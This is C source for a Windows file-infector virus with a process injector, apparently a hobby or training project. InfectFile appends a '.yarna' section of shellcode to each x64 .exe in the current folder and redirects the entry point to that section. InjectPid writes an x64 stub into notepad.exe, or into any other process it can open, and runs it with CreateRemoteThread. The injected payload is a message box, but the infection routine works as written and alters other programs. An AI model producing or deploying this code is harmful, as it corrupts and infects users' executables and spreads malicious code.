#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stddef.h>
#include <tlhelp32.h>
#include <stdint.h>
#include <synchapi.h> 
#define VIRUS_SECTION_NAME ".yarna"

typedef LONG NTSTATUS;
#define STATUS_SUCCESS ((NTSTATUS)0)

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

#define InitializeObjectAttributes(p,n,a,r,s) \
    do { \
        (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
        (p)->RootDirectory = r; \
        (p)->Attributes = a; \
        (p)->ObjectName = n; \
        (p)->SecurityDescriptor = s; \
        (p)->SecurityQualityOfService = NULL; \
    } while(0)

typedef NTSTATUS(NTAPI* NtCreateSectionPtr)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS(NTAPI* NtMapViewOfSectionPtr)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS(NTAPI* RtlCreateUserThreadPtr)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, PULONG, PULONG, PVOID, PVOID, PHANDLE, PCLIENT_ID);
typedef NTSTATUS(NTAPI* ZwUnmapViewOfSectionPtr)(HANDLE, PVOID);

BOOL InfectFile(const char* path);
DWORD FindTargetPid(const char* name);
BOOL InjectPid(DWORD pid);
static uintptr_t GetRemoteModuleBase(DWORD pid, const char* modName);

/**
 * \fn static void* memmem_local(const void* hay, size_t haylen, const void* ned, size_t nedlen)
 * \brief Search for a needle byte sequence within a haystack.
 *
 * \param hay Pointer to the haystack buffer.
 * \param haylen Length of the haystack buffer in bytes.
 * \param ned Pointer to the needle buffer.
 * \param nedlen Length of the needle buffer in bytes.
 * \return Pointer to the first occurrence of the needle in the haystack, or NULL if not found.
 */
static void* memmem_local(const void* hay, size_t haylen,
    const void* ned, size_t nedlen)
{
    if (nedlen > haylen) return NULL;
    for (size_t i = 0; i <= haylen - nedlen; i++) {
        if (memcmp((char*)hay + i, ned, nedlen) == 0)
            return (char*)hay + i;
    }
    return NULL;
}


/**
 * \fn static void* LoadShellcode(DWORD* outSize)
 * \brief Load embedded shellcode from the RCDATA resource.
 *
 * \param outSize Optional output; receives the size of the loaded shellcode.
 * \return Pointer to the shellcode in memory, or NULL on failure.
 */
static void* LoadShellcode(DWORD* outSize) {
    printf("[DEBUG] LoadShellcode: entry\n");
    HMODULE hMod = GetModuleHandleA(NULL);
    printf("[DEBUG] LoadShellcode: module base=0x%p\n", hMod);
    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(101), RT_RCDATA);
    printf("[DEBUG] LoadShellcode: FindResource -> 0x%p, GLE=0x%08X\n", hRes, GetLastError());
    if (!hRes) return NULL;
    HGLOBAL hData = LoadResource(NULL, hRes);
    printf("[DEBUG] LoadShellcode: LoadResource -> 0x%p, GLE=0x%08X\n", hData, GetLastError());
    if (!hData) return NULL;
    DWORD size = SizeofResource(NULL, hRes);
    printf("[DEBUG] LoadShellcode: SizeofResource -> %lu\n", size);
    void* ptr = LockResource(hData);
    printf("[DEBUG] LoadShellcode: LockResource -> 0x%p\n", ptr);
    if (outSize) *outSize = size;
    printf("[DEBUG] LoadShellcode: exit\n");

    return ptr;
}


/**
 * \fn uintptr_t GetRemoteProcAddress(DWORD pid, const char* dll, const char* fn)
 * \brief Compute the address of an API function in a remote process by RVA.
 *
 * \param pid Process ID of the target process.
 * \param dll Name of the DLL exporting the function (e.g. "user32.dll").
 * \param fn Name of the function to locate (e.g. "MessageBoxA").
 * \return The absolute address of the function in the target process, or 0 on failure.
 */
uintptr_t GetRemoteProcAddress(DWORD pid, const char* dll, const char* fn) {
    HMODULE hLocalMod = GetModuleHandleA(dll);
    uintptr_t localBase = (uintptr_t)hLocalMod;
    uintptr_t localFn = (uintptr_t)GetProcAddress(hLocalMod, fn);
    uintptr_t offset = localFn - localBase;
    uintptr_t remoteBase = GetRemoteModuleBase(pid, dll);
    return remoteBase + offset;
}

/**
 * \fn BOOL PatchShellcodeRemote(HANDLE hProc, DWORD pid, BYTE* code, size_t size)
 * \brief Patch two 8-byte placeholders in shellcode with remote function addresses.
 *
 * \param hProc Handle to the target process.
 * \param pid Process ID of the target process.
 * \param code Pointer to the shellcode buffer in local memory.
 * \param size Size of the shellcode in bytes.
 * \return TRUE on success, FALSE if placeholders are missing or write fails.
 */
BOOL PatchShellcodeRemote(
    HANDLE hProc,
    DWORD  pid,
    BYTE* code,
    size_t size
) {
    const BYTE zero8[8] = { 0 };

    BYTE* slot1 = memmem_local(code, size, zero8, 8);
    if (!slot1) {
        printf("[ERROR] placeholder #1 not found\n");
        return FALSE;
    }

    BYTE* slot2 = memmem_local(
        slot1 + 8,
        size - (size_t)((slot1 + 8) - code),
        zero8, 8
    );
    if (!slot2) {
        printf("[ERROR] placeholder #2 not found\n");
        return FALSE;
    }

    uintptr_t remoteMsg = GetRemoteProcAddress(pid, "user32.dll", "MessageBoxA");
    printf("[DEBUG] remote MessageBoxA = 0x%p\n", (void*)remoteMsg);
    if (!WriteProcessMemory(hProc, slot1, &remoteMsg, 8, NULL)) {
        printf("[ERROR] WriteProcessMemory MsgBoxA failed: %u\n", GetLastError());
        return FALSE;
    }

    uintptr_t remoteExit = GetRemoteProcAddress(pid, "kernel32.dll", "ExitThread");
    printf("[DEBUG] remote ExitThread = 0x%p\n", (void*)remoteExit);
    if (!WriteProcessMemory(hProc, slot2, &remoteExit, 8, NULL)) {
        printf("[ERROR] WriteProcessMemory ExitThread failed: %u\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

/**
 * \fn static DWORD AlignUp(DWORD val, DWORD align)
 * \brief Round up a value to the next multiple of a given alignment.
 *
 * \param val The value to align.
 * \param align The alignment boundary (must be power of two).
 * \return The smallest multiple of align greater than or equal to val.
 */
static DWORD AlignUp(DWORD val, DWORD align) {
    return (val + align - 1) & ~(align - 1);
}


/**
 * \fn static uintptr_t GetRemoteModuleBase(DWORD pid, const char* modName)
 * \brief Find the base address of a module loaded in a remote process.
 *
 * \param pid Process ID of the target process.
 * \param modName Name of the module (e.g. "kernel32.dll").
 * \return The base address of the module in the target process, or 0 on failure.
 */
static uintptr_t GetRemoteModuleBase(DWORD pid, const char* modName) {
    MODULEENTRY32 me = { sizeof(me) };
    HANDLE hSnap = CreateToolhelp32Snapshot(
        TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32,
        pid
    );
    if (hSnap == INVALID_HANDLE_VALUE) {
        printf("[ERROR] SnapModules(%u) failed: %u\n", pid, GetLastError());
        return 0;
    }

    if (!Module32First(hSnap, &me)) {
        printf("[ERROR] Module32First(%u) failed: %u\n", pid, GetLastError());
        CloseHandle(hSnap);
        return 0;
    }

    do {
        printf("[DEBUG]   saw module %-20s @ %p\n",
            me.szModule, me.modBaseAddr);
        if (_stricmp(me.szModule, modName) == 0) {
            uintptr_t base = (uintptr_t)me.modBaseAddr;
            CloseHandle(hSnap);
            return base;
        }
    } while (Module32Next(hSnap, &me));

    CloseHandle(hSnap);
    return 0;
}


/**
 * \fn static DWORD64 GetRemoteAddressByRVA(DWORD pid, const char* moduleName, FARPROC localAddr)
 * \brief Translate a local function pointer to its remote equivalent via RVA.
 *
 * \param pid Process ID of the target process.
 * \param moduleName Name of the module containing the function.
 * \param localAddr The local function pointer obtained via GetProcAddress.
 * \return The computed remote function address, or 0 on failure.
 */
static DWORD64 GetRemoteAddressByRVA(DWORD pid, const char* moduleName, FARPROC localAddr) {
    HMODULE localBase = GetModuleHandleA(moduleName);
    if (!localBase) {
        printf("[ERROR] GetModuleHandleA(%s) failed\n", moduleName);
        return 0;
    }

    uintptr_t offset = (uintptr_t)localAddr - (uintptr_t)localBase;

    uintptr_t remoteBase = GetRemoteModuleBase(pid, moduleName);
    if (!remoteBase) {
        return 0;
    }

    printf(
        "[DEBUG] GetRemoteAddressByRVA(%s): localBase=%p  localFn=%p  offset=0x%Ix  remoteBase=0x%Ix\n",
        moduleName, localBase, localAddr, offset, remoteBase
    );

    return (DWORD64)remoteBase + offset;
}



/**
 * \fn static BOOL InjectPid(DWORD pid)
 * \brief Inject and execute a small stub in a remote process to display a MessageBox.
 *
 * \param pid Process ID of the target process.
 * \return TRUE on successful injection and thread creation, FALSE otherwise.
 */
static BOOL InjectPid(DWORD pid) {
    printf("[DEBUG] InjectPid: entry pid=%u\n", pid);

    DWORD mySess = 0, peerSess = 0;
    ProcessIdToSessionId(GetCurrentProcessId(), &mySess);
    if (!ProcessIdToSessionId(pid, &peerSess) || peerSess != mySess) {
        printf(" [DEBUG] skip pid=%u (sess %u!=%u)\n", pid, peerSess, mySess);
        return FALSE;
    }

    HANDLE hProc = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, pid);
    if (!hProc) {
        printf(" [WARN] OpenProcess(%u): %lu\n", pid, GetLastError());
        return FALSE;
    }
    printf(" [DEBUG] OpenProcess succeeded: hProc=%p\n", hProc);

    // allocate and write our string
    const char msg[] = "pwnme 2600";
    SIZE_T  msgLen = sizeof(msg);
    LPVOID  remoteMsg = VirtualAllocEx(hProc, NULL, msgLen,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(hProc, remoteMsg, msg, msgLen, &msgLen);
    printf(" [DEBUG] wrote %zu bytes to remoteMsg=%p\n", msgLen, remoteMsg);

    HMODULE u32 = LoadLibraryA("user32.dll");
    FARPROC pMsg = GetProcAddress(u32, "MessageBoxA");
    FARPROC pExit = GetProcAddress(GetModuleHandleA("kernel32.dll"), "ExitThread");
    DWORD64 rMsg = GetRemoteAddressByRVA(pid, "user32.dll", pMsg);
    DWORD64 rExit = GetRemoteAddressByRVA(pid, "kernel32.dll", pExit);
    printf(" [DEBUG] remote MessageBoxA=%llx  ExitThread=%llx\n", rMsg, rExit);
    if (!rMsg || !rExit) {
        CloseHandle(hProc);
        return FALSE;
    }

    //    build the 64-byte x64 stub
    //    slot1 @ + 5:  pointer to remoteMsg  (rdx)
    //    slot2 @ +15:  pointer to remoteMsg  (r8)
    //    slot3 @ +25:  MB_OK                (r9d)
    //    slot4 @ +35:  MessageBoxA address  (rax)
    //    slot5 @ +56:  ExitThread address   (rax)
    BYTE stub[64] = {
      0x48,0x31,0xC9,                         // xor    rcx,rcx
      0x48,0xBA, 0,0,0,0,0,0,0,0,             // mov    rdx,slot1
      0x49,0xB8, 0,0,0,0,0,0,0,0,             // mov    r8, slot2
      0x41,0xB9, 0,0,0,0,                     // mov    r9d,slot3
      0x48,0x83,0xEC,0x28,                    // sub    rsp,0x28
      0x48,0xB8, 0,0,0,0,0,0,0,0,             // mov    rax,slot4
      0xFF,0xD0,                              // call   rax
      0x48,0x83,0xC4,0x28,                    // add    rsp,0x28
      0x48,0x31,0xC9,                         // xor    rcx,rcx
      0x48,0xB8, 0,0,0,0,0,0,0,0,             // mov    rax,slot5
      0xFF,0xD0                               // call   rax
    };

    const UINT32 mbOK = MB_OK;
    memcpy(stub + 5, &remoteMsg, sizeof(remoteMsg)); // slot1
    memcpy(stub + 15, &remoteMsg, sizeof(remoteMsg)); // slot2
    memcpy(stub + 25, &mbOK, sizeof(mbOK));     // slot3
    memcpy(stub + 35, &rMsg, sizeof(rMsg));     // slot4
    memcpy(stub + 56, &rExit, sizeof(rExit));    // slot5

    printf(" [DEBUG] stub bytes:\n    ");
    for (int i = 0; i < 64; i++) {
        printf("%02X ", stub[i]);
        if ((i & 15) == 15) printf("\n    ");
    }
    printf("\n");

    // write & execute stub
    LPVOID remoteThunk = VirtualAllocEx(hProc, NULL, 64,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProc, remoteThunk, stub, 64, NULL);
    printf(" [DEBUG] Wrote stub to remoteThunk=%p\n", remoteThunk);

    HANDLE hTh = CreateRemoteThread(
        hProc, NULL, 0,
        (LPTHREAD_START_ROUTINE)remoteThunk,
        NULL, 0, NULL);
    if (!hTh) {
        printf(" [ERROR] CreateRemoteThread: %lu\n", GetLastError());
        CloseHandle(hProc);
        return FALSE;
    }
    printf(" [DEBUG] CreateRemoteThread succeeded: hTh=%p\n", hTh);

    CloseHandle(hTh);
    CloseHandle(hProc);
    return TRUE;
}


/**
 * \fn static DWORD FindTargetPid(const char* name)
 * \brief Locate the PID of a running process by executable name, with fallback to any injectable process.
 *
 * \param name The exact executable name to search for (e.g. "notepad.exe"), or NULL for fallback only.
 * \return The PID of the matching process, or 0 if none found.
 */
static DWORD FindTargetPid(const char* name) {
    printf("[DEBUG] FindTargetPid: entry name=%s\n", name ? name : "<NULL>");
    PROCESSENTRY32 pe = { sizeof(pe) };
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) { printf("[ERROR] FindTargetPid: Snapshot failed\n"); return 0; }
    DWORD pid = 0;
    char selfName[MAX_PATH]; GetModuleFileNameA(NULL, selfName, MAX_PATH);
    char* base = strrchr(selfName, '\\'); base = base ? base + 1 : selfName;
    if (name) {
        while (Process32Next(hSnap, &pe)) {
            printf("[DEBUG] FindTargetPid: checking %s (PID=%u)\n", pe.szExeFile, pe.th32ProcessID);
            if (!_stricmp(pe.szExeFile, name)) { pid = pe.th32ProcessID; break; }
        }
    }
    if (!pid) {
        while (Process32Next(hSnap, &pe)) {
            if (pe.th32ProcessID <= 4) continue;
            if (!_stricmp(pe.szExeFile, base)) continue;
            HANDLE hTest = OpenProcess(PROCESS_CREATE_THREAD, FALSE, pe.th32ProcessID);
            if (hTest) { pid = pe.th32ProcessID; printf("[DEBUG] FindTargetPid: fallback %s (PID=%u)\n", pe.szExeFile, pid); CloseHandle(hTest); break; }
        }
    }
    CloseHandle(hSnap);
    printf("[DEBUG] FindTargetPid: exit -> %u\n", pid);
    return pid;
}

/**
 * \fn int InfectFile(const char* path)
 * \brief Append a new section to a PE file and inject shellcode into it.
 *
 * \param path File path of the target PE executable.
 * \return 1 on successful infection, 0 on failure or if already infected.
 */
int InfectFile(const char* path) {
    printf("[DEBUG] InfectFile: path=%s\n", path);

    HANDLE hFile = CreateFileA(
        path,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[ERROR] CreateFileA(%s) failed: 0x%08X\n", path, GetLastError());
        return 0;
    }

    IMAGE_DOS_HEADER dos;
    DWORD rd = 0;
    if (!ReadFile(hFile, &dos, sizeof(dos), &rd, NULL) || rd != sizeof(dos)) {
        printf("[ERROR] ReadFile DOS header failed\n");
        CloseHandle(hFile);
        return 0;
    }
    if (dos.e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[DEBUG] Not a PE file: %s\n", path);
        CloseHandle(hFile);
        return 0;
    }

    SetFilePointer(hFile, dos.e_lfanew, NULL, FILE_BEGIN);
    IMAGE_NT_HEADERS64 nt;
    if (!ReadFile(hFile, &nt, sizeof(nt), &rd, NULL) || rd != sizeof(nt)) {
        printf("[ERROR] ReadFile NT headers failed\n");
        CloseHandle(hFile);
        return 0;
    }
    if (nt.Signature != IMAGE_NT_SIGNATURE || nt.FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
        printf("[DEBUG] Unsupported PE type: %s\n", path);
        CloseHandle(hFile);
        return 0;
    }

    WORD nsec = nt.FileHeader.NumberOfSections;
    DWORD optSize = nt.FileHeader.SizeOfOptionalHeader;
    IMAGE_SECTION_HEADER* secs = malloc(nsec * sizeof(*secs));
    if (!secs) {
        printf("[ERROR] malloc failed\n");
        CloseHandle(hFile);
        return 0;
    }

    SetFilePointer(hFile, dos.e_lfanew + offsetof(IMAGE_NT_HEADERS64, OptionalHeader) + optSize,
        NULL, FILE_BEGIN);
    ReadFile(hFile, secs, nsec * sizeof(*secs), &rd, NULL);

    for (WORD i = 0; i < nsec; i++) {
        if (!_stricmp((char*)secs[i].Name, VIRUS_SECTION_NAME)) {
            printf("[DEBUG] Already infected: %s\n", path);
            free(secs);
            CloseHandle(hFile);
            return 0;
        }
    }

    // build new section header
    IMAGE_SECTION_HEADER newSec = { 0 };
    memcpy(newSec.Name, VIRUS_SECTION_NAME, IMAGE_SIZEOF_SHORT_NAME);
    DWORD fa = nt.OptionalHeader.FileAlignment,
        sa = nt.OptionalHeader.SectionAlignment;
    IMAGE_SECTION_HEADER* last = &secs[nsec - 1];
    DWORD endVA = last->VirtualAddress + max(last->Misc.VirtualSize, last->SizeOfRawData);
    DWORD newRVA = (endVA + sa - 1) & ~(sa - 1);
    DWORD fileEnd = GetFileSize(hFile, NULL);
    DWORD newPtr = (fileEnd + fa - 1) & ~(fa - 1);

    DWORD shellSize;
    void* shell = LoadShellcode(&shellSize);
    if (!shell) {
        printf("[ERROR] LoadShellcode in InfectFile failed\n");
        free(secs);
        CloseHandle(hFile);
        return 0;
    }

    newSec.Misc.VirtualSize = shellSize;
    newSec.VirtualAddress = newRVA;
    newSec.SizeOfRawData = (shellSize + fa - 1) & ~(fa - 1);
    newSec.PointerToRawData = newPtr;
    newSec.Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;

    nt.FileHeader.NumberOfSections++;
    nt.OptionalHeader.AddressOfEntryPoint = newRVA;
    nt.OptionalHeader.SizeOfImage = ((newRVA + shellSize + sa - 1) & ~(sa - 1));

    SetFilePointer(hFile, dos.e_lfanew, NULL, FILE_BEGIN);
    WriteFile(hFile, &nt, sizeof(nt), &rd, NULL);

    SetFilePointer(hFile,
        dos.e_lfanew + offsetof(IMAGE_NT_HEADERS64, OptionalHeader) + optSize + (nsec * sizeof(*secs)),
        NULL, FILE_BEGIN);
    WriteFile(hFile, &newSec, sizeof(newSec), &rd, NULL);

    if (newPtr > fileEnd) {
        DWORD pad = newPtr - fileEnd;
        BYTE* zero = calloc(pad, 1);
        SetFilePointer(hFile, 0, NULL, FILE_END);
        WriteFile(hFile, zero, pad, &rd, NULL);
        free(zero);
    }

    SetFilePointer(hFile, newPtr, NULL, FILE_BEGIN);
    WriteFile(hFile, shell, shellSize, &rd, NULL);

    printf("[DEBUG] Successfully infected: %s\n", path);
    free(secs);
    CloseHandle(hFile);
    return 1;
}


/**
 * \fn int main(void)
 * \brief Entry point: infects all EXEs in the current directory and attempts process injection.
 *
 * \return Exit code (0 on success, non-zero on error).
 */
int main(void) {
    printf("[DEBUG] Lancement injector.exe\n");

    char selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);
    const char* selfName = strrchr(selfPath, '\\');
    selfName = selfName ? selfName + 1 : selfPath;

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA("*.exe", &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (_stricmp(fd.cFileName, selfName) != 0) {
                InfectFile(fd.cFileName);
            }
        } while (FindNextFileA(hFind, &fd));
        FindClose(hFind);
    }

    DWORD pid = FindTargetPid("notepad.exe");
    if (pid) {
        printf("[DEBUG] Found notepad.exe (PID=%u), injecting...\n", pid);
        if (InjectPid(pid)) {
            printf("[DEBUG] Injection succeeded for notepad.exe (PID=%u)\n", pid);
            goto done;
        }
        else {
            printf("[WARN] Injection failed for notepad.exe (PID=%u)\n", pid);
        }
    }
    /*else {
        // Launch Notepad if not running
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        if (CreateProcessA(
            "C:\\Windows\\System32\\notepad.exe",
            NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
        {
            WaitForInputIdle(pi.hProcess, 2000 /*ms);
            if (WaitForInputIdle(pi.hProcess, 2000) == 0) {
                printf("[DEBUG] Notepad is idle, injecting (PID=%u)…\n", pi.dwProcessId);
            }
            else {
                            // fallback small sleep if WaitForInputIdle times out
                Sleep(500);
                printf("[DEBUG] Fallback sleep done, injecting (PID=%u)…\n", pi.dwProcessId);
                
            }
             if (InjectPid(pi.dwProcessId)) {
                printf("[DEBUG] Injection succeeded for new notepad.exe (PID=%u)\n", pi.dwProcessId);
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                goto done;
            }
            else {
                printf("[WARN] Injection failed for new notepad.exe (PID=%u)\n", pi.dwProcessId);
            }
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }
        else {
            printf("[WARN] Could not launch notepad.exe: %u\n", GetLastError());
        }
    }*/

    PROCESSENTRY32 pe = { sizeof(pe) };
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        printf("[ERROR] Could not snapshot processes\n");
        return 1;
    }

    while (Process32Next(hSnap, &pe)) {
        if (_stricmp(pe.szExeFile, selfName) == 0)
            continue;
        if (InjectPid(pe.th32ProcessID)) {
            printf("[DEBUG] Injection succeeded for %s (PID=%u)\n",
                pe.szExeFile, pe.th32ProcessID);
            break;
        }
    }
    CloseHandle(hSnap);

done:
    printf("[DEBUG] Fin \n");
    return 0;
}



